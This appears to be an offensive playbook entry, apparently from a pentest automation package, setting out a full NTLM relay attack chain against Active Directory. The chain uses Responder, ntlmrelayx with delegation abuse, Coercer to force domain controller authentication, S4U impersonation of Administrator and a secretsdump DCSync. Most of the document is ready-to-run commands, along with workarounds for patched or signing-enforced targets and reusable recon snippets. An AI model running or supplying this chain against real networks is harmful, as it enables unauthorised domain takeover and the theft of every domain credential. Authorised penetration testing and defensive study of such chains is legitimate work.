# [2026-04] NTLM Relay + Coercer → domain admin (no password needed)

## Scenario classification
Pentest / intranet / AD attack

## Target overview
With an intranet foothold but no credentials, obtain domain admin via the NTLM Relay attack chain.

## Full execution chain

1. After getting intranet access, start Responder (with SMB/HTTP disabled)
   ```bash
   # Edit /etc/responder/Responder.conf
   # SMB = Off, HTTP = Off
   responder -I eth0 -v
   ```

2. Start ntlmrelayx relaying to LDAP (for the AD CS attack)
   ```bash
   ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
   ```

3. Use Coercer to force the DC to authenticate to us
   ```bash
   coercer coerce -u '' -p '' -d domain.local \
     -l attacker_ip -t dc01.domain.local --always-continue
   ```

4. The DC's machine account NTLM authentication is relayed to LDAP
5. ntlmrelayx automatically creates a machine account and configures constrained delegation
6. Use S4U2Self + S4U2Proxy to impersonate domain admin
   ```bash
   getST.py -spn cifs/dc01.domain.local \
     -impersonate Administrator \
     domain.local/CREATED_MACHINE\$:'password' -dc-ip 10.0.0.1
   ```

7. DCSync using the ticket
   ```bash
   export KRB5CCNAME=Administrator.ccache
   secretsdump.py -k -no-pass dc01.domain.local
   ```

## Pitfall log

| Problem | Cause | Solution | Time spent |
|---------|-------|----------|------------|
| Coercer cannot trigger an authentication | Target DC patched against PetitPotam | Switch to PrinterBug (MS-RPRN) | 30min |
| ntlmrelayx reports LDAP signing required | DC has LDAP signing enabled | Relay to LDAPS (636) or to the HTTP AD CS endpoint instead | 20min |
| Created machine account cannot do S4U | Domain policy limits machine account creation | Use an existing low-privileged domain user account instead | 15min |

## Toolchain findings
- Coercer is more convenient than manually invoking PetitPotam; it tries multiple RPC interfaces automatically
- ntlmrelayx's `--delegate-access` flag is key: it completes the delegation configuration automatically
- If LDAP signing is enabled, relay to the AD CS HTTP endpoint instead (ESC8)

## Key code/commands

```bash
# Full attack chain (needs 3 terminals)
# Terminal 1: Responder
responder -I eth0 -v

# Terminal 2: ntlmrelayx
ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access --escalate-user attacker

# Terminal 3: Coercer
coercer coerce -u '' -p '' -d domain.local -l attacker_ip -t dc01.domain.local
```

## Reusable patterns/script snippets

```bash
# Quick NTLM Relay feasibility checks
# 1. Check SMB signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# 2. Check LDAP signing
crackmapexec ldap dc01.domain.local -u '' -p '' -M ldap-checker

# 3. Check which protocols can be coerced
coercer scan -u user -p pass -d domain.local -t dc01.domain.local
```

## Improvement suggestions for this package
- Coercer and Responder are already in routing and bootstrap ✓
- ntlmrelayx is part of the impacket suite, preinstalled on Kali ✓

## Evolution actions
- [x] No update needed (already covered)

## Environment info
- Kali 2026.1, impacket 0.12.0, coercer 2.4.3
- Target: Windows Server 2022 DC, domain functional level 2016
- Prerequisite: intranet foothold already obtained (via a VPN vulnerability)
